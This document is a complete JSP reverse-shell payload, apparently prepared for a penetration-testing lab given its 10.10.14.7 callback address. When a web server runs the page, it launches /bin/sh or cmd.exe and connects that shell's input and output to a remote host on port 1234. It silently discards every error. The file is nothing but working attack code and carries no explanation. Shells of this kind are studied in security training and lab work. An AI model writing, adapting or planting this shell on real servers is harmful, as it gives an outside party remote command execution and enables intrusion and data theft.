<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream db;
    OutputStream al;

    StreamConnector( InputStream db, OutputStream al )
    {
      this.db = db;
      this.al = al;
    }

    public void run()
    {
      BufferedReader iV  = null;
      BufferedWriter deA = null;
      try
      {
        iV  = new BufferedReader( new InputStreamReader( this.db ) );
        deA = new BufferedWriter( new OutputStreamWriter( this.al ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = iV.read( buffer, 0, buffer.length ) ) > 0 )
        {
          deA.write( buffer, 0, length );
          deA.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( iV != null )
          iV.close();
        if( deA != null )
          deA.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.10.14.7", 1234 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
